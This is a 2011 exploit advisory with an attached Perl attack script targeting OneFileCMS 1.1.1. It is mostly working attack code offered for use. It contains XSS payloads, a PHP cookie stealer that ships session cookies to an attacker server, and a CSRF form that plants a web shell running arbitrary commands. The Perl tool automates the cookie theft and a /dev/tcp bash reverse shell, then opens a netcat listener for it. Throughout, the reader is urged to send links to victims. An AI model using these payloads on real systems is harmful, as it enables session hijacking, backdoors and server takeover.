# Exploit Title: OneFileCMS v.1.1.1 Multiple Remote Vulnerabilities
# Google Dork: --
# Date: 21/8/2011
# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr
# Software Link: http://onefilecms.com/download/onefilecms_site_v1.1.1.zip
# Version: OneFileCMS v.1.1.1
# Tested on: Linux Fedora 14

===============
 Description
===============
OneFileCMS is just that. It's a flat, light, one file CMS (Content Management System) entirely contained in an easy-to-implement, highly customizable, database-less PHP script. Coupling a utilitarian code editor with all the basic necessities of an FTP application, OneFileCMS can maintain a whole website completely in-browser without any external programs.

=======================================================
 [!] All vulnerabilities requires authentication. [!] 
=======================================================

============================================
0x01. Cross Site Scripting vulnerability
============================================

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><marquee><h1>XSS Vulnerability<script>alert(String.fromCharCode(88,83,83))</script></h1></marquee>

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><script>document.body.innerHTML="<style>body{visibility:hidden; background:black;}</style><div style=visibility:visible;><center><h1><font color='white'>Please fix your </font><font color='red'> XSS </font><font color='white'>!</font></h1><br>";</script>

-----------------------------------------------------------------------------
[!] Redirection to Google through the cross site scripting vulnerability [!]
------------------------------------------------------------------------------

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><body onload="document.phising.submit();"><form name="phising" action="http://google.com"></form></body></html>

...BUT, don't forget to encode it!!!

http://localhost/onefilecms/onefilecms.php?p=27%22%3e%3c%62%6f%64%79%20%6f%6e%6c%6f%61%64%3d%22%64%6f%63%75%6d%65%6e%74%2e%70%68%69%73%69%6e%67%2e%73%75%62%6d%69%74%28%29%3b%22%3e%3c%66%6f%72%6d%20%6e%61%6d%65%3d%22%70%68%69%73%69%6e%67%22%20%61%63%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%22%3e%3c%2f%66%6f%72%6d%3e%3c%2f%62%6f%64%79%3e%3c%2f%68%74%6d%6c%3e

=========================================================
0x02 Cross Site Request Foregery (CSRF) vulnerability
=========================================================

---------------------------------------
 [!] Steal the cookie (sessionid) [!]
---------------------------------------

--- stealer.php ---
<?php
header ('Location:http://VICTIM_SERVER/onefilecms/onefilecms.php?f=index.php');
$cookie = $_GET['cookie'];
$log = fopen("gotit.txt", "a");
fwrite($log, $cookie ."\n");
fclose($log);
?>
--- end ---

Send this link to your victim...

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><script>document.location="http://ATTACKER_SERVER/stealer.php?cookie="+document.cookie;</script>

...BUT, don't forget to encode it first!!!

http://VICTIM_SERVER/onefilecms/onefilecms.php?p=%27%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%22%68%74%74%70%3A%2F%2F%41%54%54%41%43%4B%45%52%5F%53%45%52%56%45%52%2F%73%74%65%61%6C%65%72%2E%70%68%70%3F%63%6F%6F%6B%69%65%3D%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B%3C%2F%73%63%72%69%70%74%3E

Now, check the "gotit.txt" file for the cookie.
Replace the value of the "sessionid" with the cookie that you already grab...

------------------------------------------
 [!] Create the evil file "csrf.php" [!]
------------------------------------------

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><html><body onload='document.f.submit()'>
<form method=post name=f action="http://localhost/onefilecms/onefilecms.php">
<input type="hidden" name="sessionid" value="HERE_PASTE_THE_VALUE">
<input type="hidden" name="filename" value="csrf.php">
<input name="content" value="<pre><?php system($_GET['cmd']);exit;?>">
<input type="submit" name="Save">
</form></body></html>

....enjoy the backdoor :)
http://VICTIM_SERVER/onefilecms/csrf.php?cmd=[command]

------------------------------------------
 [!] Delete the evil file "csrf.php" [!]
------------------------------------------

http://VICTIM_SERVER/onefilecms/onefilecms.php?p='"><html><body onload='document.f.submit()'>
<form method=post name=f action="http://localhost/onefilecms/onefilecms.php">
<input type="hidden" name="sessionid" value="HERE_PASTE_THE_VALUE">
<input type="hidden" name="delete_filename" value="csrf.php">
<input type="submit" name="Yes">
</form></body></html>

#!/usr/bin/perl
#
# Exploit Title: OneFileCMS v.1.1.1 Remote Code Execution Exploit
# Date: 22/8/2011
# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr
# Software Link: http://onefilecms.com/download/onefilecms_site_v1.1.1.zip
# Version: OneFileCMS v.1.1.1
# Tested on: Linux Fedora 14

use LWP::UserAgent;

print "\n   |==[ mr.pr0n ]=============================================== |\n";
print "   | OneFileCMS 1.1.1 - [R]emote [C]ode [E]xecution [E]xploit    |\n";
print "   |===================[ http://ghostinthelab.wordpress.com/ ]== |\n";

print "\nEnter the target (e.g.: http://victim.com)";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);

print "Enter the OneFileCMS directory (e.g.: onefilecms)";
print "\n> ";
$dir=<STDIN>;
chomp($dir);

$target = $target."/".$dir;

menu:;
print "\n[+] Main Menu:\n";
print "    1. Steal the \"sessionid\" cookie.\n";
print "    2. Get a shell on your target.\n";
print "    3. Exit.\n"	;
 
print "> ";
$option=<STDIN>;
if ($option!=1 && $option!=2 && $option!=3)
{
	print "Oups, wrong option.\nPlease, try again.\n";
	goto menu;
}

	if ($option==1)
	{&cookie} 
	if ($option==2)
	{&shell}		
	if ($option==3)
	{&quit}	

sub cookie
{
	print "Enter the address of the \"stealer.php\" (e.g.: http://attacker.com/stealer.php)";
	print "\n> ";
	$stealer=<STDIN>;
	chomp($stealer);

	# -------------------------------------------------------------------------------------
	# stealer.php - source code
	# -------------------------------------------------------------------------------------
	# <?php
	# header ('Location:http://VICTIM_SERVER/onefilecms/onefilecms.php?f=index.php');
	# $cookie = $_GET['cookie'];
	# $log = fopen("gotit.txt", "a");
	# fwrite($log, $cookie ."\n");
	# fclose($log);
	# ?>
	# --------------------------------------------------------------------------------------

	$result = "'\"><script>document.location=\"$stealer?cookie=\"+document.cookie\;</script>";
	$result =~ s/(.)/sprintf("%x%",ord($1))/eg;

	print "\n[+] Send this link to your victim ...\n\n";
	print $target."/onefilecms.php?p=".$result."\n";
	goto menu;
}

sub shell
{
	print "Enter the sessionid:";
	print "\n> ";
	$sessionid=<STDIN>;
	chomp($sessionid);

	print "Enter the IP address for the reverse connection (e.g.: 192.168.178.25)";
	print "\n> ";
	$ip=<STDIN>;
	chomp($ip);

	print "Enter the port to connect back on (e.g.: 4444)";
	print "\n> ";
	$port=<STDIN>;
	chomp($port);

	$payload = 
	"<?php ".
	"system('/bin/bash -i > /dev/tcp/$ip/$port 0\<&1 2\>&1');".
	"?>";

	$filename = "index_".int(rand()*1011).".php";

	$csrf =
	"'\"><html><body onload='document.f.submit()'>".
	"<form method=post name=f action=\"$target/onefilecms.php\">".
	"<input type=\"hidden\" name=\"sessionid\" value=\"$sessionid\">".
	"<input type=\"hidden\" name=\"filename\" value=\"$filename\">".
	"<input name=\"content\" value=\"$payload\">".
	"<input type=\"submit\" name=\"Save\">".
	"</form></body></html>";

	$csrf =~ s/(.)/sprintf("%x%",ord($1))/eg;

	print "\n[+] Send this link to your victim...\n\n";
	print $target."/onefilecms.php?p=".$csrf."\n";

	$nc= "nc -lvp $port";
	system("xterm -e $nc &");

	print "\n[+] Please be patient...\n";
	while (1)
	{
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target."/".$filename);
		if ($check->content =~ m/was not found/g)
		{
			sleep(10);
		}
}
goto menu;
}

sub quit
{
exit(1);
}